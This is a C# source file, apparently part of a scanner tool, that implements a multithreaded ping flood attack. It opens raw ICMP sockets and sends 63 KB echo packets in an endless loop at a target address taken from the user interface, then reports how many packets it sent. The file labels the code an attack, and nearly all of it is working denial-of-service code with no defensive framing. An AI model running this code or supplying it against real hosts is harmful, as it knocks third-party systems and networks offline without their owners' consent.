using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace MyScanner.MyClasses
{
    /// <summary>
    /// PingFlood攻击
    /// </summary>
    class CPingFlood
    {
        public int threadOrder;
        public string aimAddr;
        public int threadCount;
        MyScanner.Scanner ui;
        private static long packNum;
        private bool keepFlood;
        private static int threadFinish;

        /// <summary>
        /// 构造函数,初始化参数
        /// </summary>
        /// <param name="ui"></param>
        public CPingFlood(Scanner ui)
        {
            this.ui = ui;
            aimAddr = ui.aimIPAddress.Text.ToString();
            threadCount = Scanner.threadCount;
        }

        /// <summary>
        /// 开始进行PingFlood攻击
        /// </summary>
        public void BeginPingFlood()
        {
            Thread[] pFloodThread = new Thread[threadCount];
            keepFlood = true;
            threadFinish = 0;
            packNum = 0;
            for (int i = 0; i < threadCount; i++)
            {
                pFloodThread[i] = new Thread(new ThreadStart(PingHost));
                pFloodThread[i].Start();
            }
        }

        /// <summary>
        /// 结束攻击
        /// </summary>
        public void StopPingFlood()
        {
            keepFlood = false;
        }

        /// <summary>
        /// 向目标主机发送Ping包
        /// </summary>
        public void PingHost()
        {
            //初始化Socket套接字 
            //三个参数分别为： 
            // 1。解析地址的地址模式，较常用的为AddressFamily.InterNetwork，即IPv4地址。 
            // 2。Socket套接字类型，一般为SocketType.Raw原始类型。 
            // 3。网络协议类型，这里Ping用的是Internet控制报文协议ProtocolType.Icmp.  
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);

            IPHostEntry clientInfo;
            try
            {
                clientInfo = Dns.GetHostByName(aimAddr);
            }
            catch (Exception)
            {
                //解析主机名错误。 
                UpdateTBResult(ui, "解析主机名错误。\r\n");
                return;
            }
            // 取客户机0号端口 
            EndPoint clientPoint = (EndPoint)new IPEndPoint(clientInfo.AddressList[0], 0);

            //设置ICMP报文 
            int DataSize = 1024*63; // ICMP数据包大小，总大小不超过64*1024
            int PacketSize = DataSize + 8;//总报文长度 
            const int ICMP_ECHO = 8;
            IcmpPacket packet = new IcmpPacket(ICMP_ECHO, 0, 0, 45, 0, DataSize);

            //将ICMP报文信息和数据转化为Byte数据包 
            Byte[] Buffer = new Byte[PacketSize];
            int index = packet.ConvertToByte(Buffer);
            //报文出错 
            if (index != PacketSize)
            {
                //报文出错
                UpdateTBResult(ui, "报文出错\r\n");
                return;
            }
            //校验和的计算 
            int count = (int)Math.Ceiling(((Double)index) / 2);
            UInt16[] Buffer2 = new UInt16[count];

            index = 0;
            for (int i = 0; i < count; i++)
            {
                //将两个byte转化为一个UInt16 
                Buffer2[i] = BitConverter.ToUInt16(Buffer, index);
                index += 2;
            }
            //将校验和保存至报文里 
            packet.CheckSum = IcmpPacket.SumOfCheck(Buffer2);
            // 保存校验和后，再次将报文转化为数据包 
            Byte[] SendData = new Byte[PacketSize];
            index = packet.ConvertToByte(SendData);
            //报文出错 
            if (index != PacketSize)
            {
                UpdateTBResult(ui, "报文出错\r\n");
                return;
            }
            //收发动作 
            while(keepFlood)
            {
                try
                {
                    socket.SendTo(SendData, PacketSize, SocketFlags.None, (EndPoint)clientPoint);
                    packNum++;
                }
                catch
                {
                    //无法发送
                }
            }
            //关闭套接字 
            socket.Close();
            threadFinish++;
            if(threadFinish == threadCount)
            {
                UpdateTBResult(ui, "PingFlood攻击结束！共向 " + aimAddr + " 发送了 " + packNum.ToString() + " 个数据包\r\n");
            }
        }

        /// <summary>
        /// 创建跨线程更新界面信息的委托
        /// </summary>
        /// <param name="ui"></param>
        /// <param name="txt"></param>
        public delegate void DeleUpdateTBResult(Scanner ui, string txt);

        /// <summary>
        /// 跨线程更新界面信息
        /// </summary>
        /// <param name="ui"></param>
        /// <param name="txt"></param>
        public void UpdateTBResult(Scanner ui, string txt)
        {
            if (ui.InvokeRequired)
            {
                Delegate d = new DeleUpdateTBResult(UpdateTBResult);
                ui.Invoke(d, new Object[] { ui, txt });
            }
            else
            {
                ui.TBResult.Text += txt;
            }
        }
    }
    
    /// <summary>
    /// ICMP报文类
    /// </summary>
    public class IcmpPacket
    {
        private Byte _type; // 报文类型 
        private Byte _subCode; // 字代码类型 
        private UInt16 _checkSum; // 报文校验和 
        private UInt16 _identifier; // 识别符 
        private UInt16 _sequenceNumber; // 序列号  
        private Byte[] _data; //数据包 
        /// <summary>
        /// 初始化报文 
        /// </summary>
        /// <param name="type"></param>
        /// <param name="subCode"></param>
        /// <param name="checkSum"></param>
        /// <param name="identifier"></param>
        /// <param name="sequenceNumber"></param>
        /// <param name="dataSize"></param>
        public IcmpPacket(Byte type, Byte subCode, UInt16 checkSum, UInt16 identifier, UInt16 sequenceNumber, int dataSize)
        {
            _type = type;
            _subCode = subCode;
            _checkSum = checkSum;
            _identifier = identifier;
            _sequenceNumber = sequenceNumber;
            _data = new Byte[dataSize];
            //long newSize = 1024*1024*1024;
            for (int i = 0; i < dataSize; i++)
            {
                _data[i] = (byte)'#';
            }
        }
        public UInt16 CheckSum
        {
            get
            {
                return _checkSum;
            }
            set
            {
                _checkSum = value;
            }
        }
        /// <summary>
        /// 将整个ICMP报文信息和数据转化为Byte数据包
        /// </summary>
        /// <param name="buffer"></param>
        /// <returns></returns>
        public int ConvertToByte(Byte[] buffer)
        {
            Byte[] b_type = new Byte[1] { _type };
            Byte[] b_code = new Byte[1] { _subCode };
            Byte[] b_cksum = BitConverter.GetBytes(_checkSum);
            Byte[] b_id = BitConverter.GetBytes(_identifier);
            Byte[] b_seq = BitConverter.GetBytes(_sequenceNumber);
            int i = 0;
            Array.Copy(b_type, 0, buffer, i, b_type.Length);
            i += b_type.Length;
            Array.Copy(b_code, 0, buffer, i, b_code.Length);
            i += b_code.Length;
            Array.Copy(b_cksum, 0, buffer, i, b_cksum.Length);
            i += b_cksum.Length;
            Array.Copy(b_id, 0, buffer, i, b_id.Length);
            i += b_id.Length;
            Array.Copy(b_seq, 0, buffer, i, b_seq.Length);
            i += b_seq.Length;
            Array.Copy(_data, 0, buffer, i, _data.Length);
            i += _data.Length;
            return i;
        }
        /// <summary>
        /// 根据ICMP报文协议进行校验和计算
        /// </summary>
        /// <param name="buffer"></param>
        /// <returns></returns>
        public static UInt16 SumOfCheck(UInt16[] buffer)
        {
            int sum = 0;
            for (int i = 0; i < buffer.Length; i++)
            {
                sum += (int)buffer[i];
            }
            sum = (sum >> 16) + (sum & 0xffff);
            sum += (sum >> 16);
            return (UInt16)(~sum);

        }
    }
}
   
